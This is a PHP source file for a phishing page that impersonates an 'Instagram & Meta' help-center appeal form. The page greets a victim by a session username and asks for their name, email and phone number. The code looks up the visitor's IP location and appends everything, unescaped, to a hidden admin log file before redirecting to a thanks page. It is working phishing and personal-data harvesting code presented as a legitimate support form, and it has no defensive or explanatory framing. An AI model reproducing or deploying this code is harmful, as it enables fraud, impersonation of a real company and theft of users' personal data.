<?php 
error_reporting(0);
session_start();

if($_POST) {
    $clawzuser=$_SESSION["clawzuser"];
    $clawzname=$_POST["clawzname"];
    $clawzmail=$_POST["clawzmail"];
    $clawznumber=$_POST["clawznumber"];
    $ip=$_SERVER["REMOTE_ADDR"];
    $konum = file_get_contents("http://ip-api.com/xml/".$ip);
    $cek = new SimpleXMLElement($konum);
    $ulke = $cek->country;
    $sehir = $cek->city;
    date_default_timezone_set('Europe/Istanbul');
    $date=date("d-m-Y H:i:s");
  
  $file = fopen('admin/wclawzbilgiler.php' , 'a');
  fwrite($file , "
  <html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000'>
<body bgcolor='black'>

<font color='red'> İsim Soyisim: </font><font color='white'>".$clawzname."</font><br>
<font color='red'> Mail adrsi: </font><font color='white'>".$clawzmail."</font><br>
<font color='red'> Telefon numarası: </font><font color='white'>".$clawznumber."</font><br>
<font color='yellow'>Ip Adresi: </font><font color='white'>".$ip."</font><hr size='0.5px' color='white'>
");
  fclose($file);
  header("Location:thanks.php");
    
}


/*
  
      ____ ___  ____  _____ ____
     / ___/ _ \|  _ \| ____|  _ \
    | |  | | | | | | |  _| | |_) |
    | |__| |_| | |_| | |___|  _ <
    \____\___/|____/|_____|_| \_\
 
     ______   __
    | __ ) \ / /
    |  _ \\ V /
    | |_) || |
    |____/ |_|
  
   _____ _          __          ________
  / ____| |        /\ \        / /___  /
 | |    | |       /  \ \  /\  / /   / /
 | |    | |      / /\ \ \/  \/ /   / /
 | |____| |____ / ____ \  /\  /   / /__
  \_____|______/_/    \_\/  \/   /_____|




        



*/


?> 




<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="stylesheet" href="style.css">
    <title>Appeal</title>
</head>
<body>
    <center>
        <div class="up"> <br>
        <h2>Instagram & Meta </h2>
        <h4>Help and Contact Center ©</h4>
    </div> 
    <br>
    <div class="middle">
        <p>Dear <?php $clawzuser=$_SESSION["clawzuser"];
    echo $clawzuser ;?>, you have come to the appeal form.  You can fill in the following questions correctly and write your objection in the blank at the bottom.</p>
        <form method="post">
            <br>
            <input required type="text" name="clawzname" class="inputcwz" placeholder="Name and Surname"> 
            <br><br>
            <input required type="email" name="clawzmail" class="inputcwz" placeholder="E-Mail Adress"> 
            <br><br>
            <input required type="tel" name="clawznumber" class="inputcwz" placeholder="Phone Number for Contact"> 
            <br><br>
            <input style="height:70px;" type="text" class="inputcwz" placeholder="Your Appeal (Optional)"> <br><br> 
            <input type="submit" class="btn" value="Continue">
        </form>
    </div> <br>
    <br> <br>
    <br>
    <br>
    <img width="150" src="https://www.citypng.com/public/uploads/small/11640344612dld2zxme2wo06d5tycstmtr5wd5ka5xkw95yyifgxyzoqcw5lfc8hyjc7rkl0hzykywrw10ibe6vbd4ovrwrlfkwokcgn9fxqs5g.png" alt="">
    </center>
</body>
</html>